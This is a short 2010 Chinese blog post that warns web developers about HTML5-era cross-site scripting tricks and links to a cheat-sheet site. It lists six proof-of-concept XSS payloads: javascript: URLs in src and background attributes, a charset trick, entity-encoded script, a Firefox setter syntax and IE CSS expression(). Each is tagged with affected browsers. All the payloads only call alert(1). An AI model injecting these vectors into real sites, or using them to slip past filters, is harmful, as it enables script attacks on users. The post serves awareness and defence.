# HTML 安全列表
>date: 2010-05-12T08:57:38+08:00


下面这个网站罗列了，几乎所有的关于HTML 5 在各种主流浏览器上的安全问题，这些安全问题很有可能将会是黑客攻击你的网上的敲门砖，他们几乎都和Javascript都有关系，你就要好好注意了。


[**http://heideri.ch/jso/**](http://heideri.ch/jso/)


下面罗列几个：


**1）<table background=”javascript:alert(1)”>**


IE6，7，8，9，和Opera 8.x, 9.x, 10.x 都支持这样的语法。


**2）<meta charset=”mac-farsi”>¼script¾alert(1)¼/script¾**


这个问题会存在于所有的Firefox版本中，可以让用户进行XSS（跨站脚本）攻击


**3）<script>&amp;#x61;l&amp;#x65;rt&amp;#40;1)</script>**


在<script>和<style>的TAG间，根据标据，其可以使用这样的字符来运行脚本。这在所有版本的Firefox, Opera, 和 Chrome中都会有问题。



**4）({set/\*\*/$($){\_/\*\*/setter=$,\_=1}}).$=alert**


上面这个是Firefox的一个[语法](https://developer.mozilla.org/en/Core_JavaScript_1.5_Guide/Working_with_Objects#Defining_Getters_and_Setters)，也会产生XSS攻击。


**5）<div style=”font-family:foo}x=expression(write(1));”>XXX</div>**


自从IE5.5后，直到IE9，IE就可以支持上面这样的语法。


**6）src中是可以运行脚本的，如：**


<embed src=”javascript:alert(1)”>  

<img src=”javascript:alert(1)”>  

<image src=”javascript:alert(1)”>  

<script src=”javascript:alert(1)”>


又一个XSS攻击，几乎所有的浏览器都支持这样的方式，如：Firefox全部版本，Chrome 4.x/5.x，Opera 8.x/9.x/10.0，IE 6.0/7.0和Safari 3.x/4.x



还有很多，大家自己去看吧，这个网站经常更新的。总体感觉下来，IE和Firefox的安全问题都在伯仲之间，Safari貌似是问题最少的。





